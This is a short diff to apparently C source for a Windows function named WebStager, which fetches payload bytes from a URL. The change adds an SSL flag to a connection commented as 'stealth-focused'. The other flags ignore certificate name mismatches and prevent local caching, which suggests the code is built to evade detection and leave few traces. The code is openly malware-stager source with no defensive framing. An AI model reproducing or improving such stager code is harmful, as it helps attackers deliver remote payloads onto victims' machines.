@@ -39,6 +39,7 @@ BOOL WebStager(LPCWSTR szUrl, LPCWSTR szUserAgent, PBYTE* pPayloadBytes, SIZE_T*
 
     // Open URL with stealth-focused connection flags
     hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0,
+        INTERNET_FLAG_SECURE |                // Use SSL
         INTERNET_FLAG_EXISTING_CONNECT |     // Reuse existing connection
         INTERNET_FLAG_IGNORE_CERT_CN_INVALID | // Ignore certificate name mismatches
         INTERNET_FLAG_NO_CACHE_WRITE |       // Prevent local caching
